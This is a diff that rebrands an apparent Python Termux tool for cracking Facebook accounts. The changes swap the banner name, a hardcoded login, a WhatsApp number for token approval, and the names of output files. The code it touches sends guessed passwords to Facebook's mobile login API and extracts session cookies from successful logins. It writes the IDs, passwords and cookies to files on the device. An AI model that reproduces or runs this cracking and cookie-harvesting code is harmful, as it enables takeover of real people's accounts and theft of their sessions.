@@ -34,7 +34,7 @@ import os,zlib
 from os import system as osRUB
 from os import system as cmd
 os.system('clear')
-print('         \x1b[38;5;46m WELCOME TO ASIF WORLD          ')
+print('         \x1b[38;5;46m WELCOME TO ASIF SAKHANI TOOL         ')
 
 
 try:
@@ -147,7 +147,7 @@ attemps = 0
 while attemps < 12345677901:
     username = input(' \033[0;92mEnter Username: ')
     password = input(' \033[0;93mEnter Password: ')
-    if username == 'ASIF' and password == 'ASIF':
+    if username == 'Asif' and password == 'Sakhani':
         print(' \033[0;92mYou Have Successfully Logged in.')
         break
     else:
@@ -179,7 +179,7 @@ def meyexudi():
       print(' \x1b[1;97m║══[𝟸] WI-FI  AND DATA BOTH WORKING 100%')
       print(" \x1b[0m║══[𝟸] YOUR KEY : "+id)
       input(' \033[1;30m╚══[𝟹] IF U WANT TO BUY THEN PRESS ENTER ')
-      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.link/5evi6q?text='+tks),approval()      
+      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+923417020930?text='+tks),approval()      
       time.sleep(1)
       meyexudi()
   except:
@@ -373,10 +373,10 @@ class main_crack():
                     print(f"\r{R} [ASIF-OK] {sid} | {ps} ")
 				#	#{S}\n[cookie[🔥]={ckkk}
                     oks.append(sid)
-                    open('/sdcard/FMZ-999_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Asif_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/ASIF_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Asif_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                    print(f"\r{A} [FMZ-999-CP] {sid} | {ps} {S}")
+                    print(f"\r{A} [ASIaf-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/ASIF_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
@@ -672,14 +672,14 @@ class main_crack():
                 q = session.post("https://b-api.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ASIFgift = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ASIFgift};{ckkk}"
-                    print(f"\r{R} [FMZ-999-OK] {sid} | {ps} {S}\n[cookie[🔥]={ckkk}")
+                    print(f"\r{R} [ASIF-OK] {sid} | {ps} {S}\n[cookie[🔥]={ckkk}")
                     oks.append(sid)
-                    open('/sdcard/FMZ-999_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Asif_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/ASIF_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Asif_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                    print(f"\r{A} [FMZ-999-CP] {sid} | {ps} {S}")
+                    print(f"\r{A} [ASIF-CP] {sid} | {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard/FMZ-999_CP.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/ASIF_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
                     continue
             loop+=1
